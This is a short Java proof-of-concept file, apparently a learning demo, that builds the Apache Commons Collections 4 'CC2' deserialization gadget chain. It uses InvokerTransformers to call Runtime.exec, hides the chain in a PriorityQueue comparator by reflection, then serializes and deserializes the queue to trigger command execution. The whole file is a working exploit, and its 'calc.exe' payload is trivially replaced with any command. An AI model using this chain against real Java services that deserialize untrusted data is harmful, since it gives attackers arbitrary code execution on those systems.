package org.example.cc;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
public class cc2Demo1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        ChainedTransformer chain = new ChainedTransformer(new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec",new Class[] { String.class }, new Object[]{"calc.exe"}));
        TransformingComparator comparator = new TransformingComparator(chain);
        PriorityQueue queue = new PriorityQueue(1);

        queue.add(1);
        queue.add(2);

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue,comparator);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("result.ser"));
            outputStream.writeObject(queue);
            outputStream.close();
            ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(new File("result.ser")));
            objectInputStream.readObject();
            objectInputStream.close();
        }catch(Exception e){
            e.printStackTrace();
        }

    }
}

